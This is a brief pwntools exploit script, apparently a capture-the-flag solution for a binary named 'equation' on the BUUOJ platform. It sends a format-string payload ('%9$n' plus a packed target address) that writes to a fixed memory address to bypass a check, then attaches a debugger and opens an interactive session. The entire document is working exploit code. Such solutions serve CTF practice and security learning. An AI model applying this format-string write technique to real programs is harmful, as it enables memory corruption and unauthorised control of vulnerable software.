from pwn import *
context(os="linux",arch="amd64",log_level="debug")
p=process("./equation")
#p=remote("node5.buuoj.cn",29480)
elf=ELF("equation")

def debug():
    gdb.attach(p)
    pause()

libc=ELF("glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
judge_addr=0x060105C

payload=b"aa%9$naaa"+p64(judge_addr)
#payload=fmtstr_payload(9,{judge_addr:0x2},2)
p.send(payload)
debug()
p.interactive()
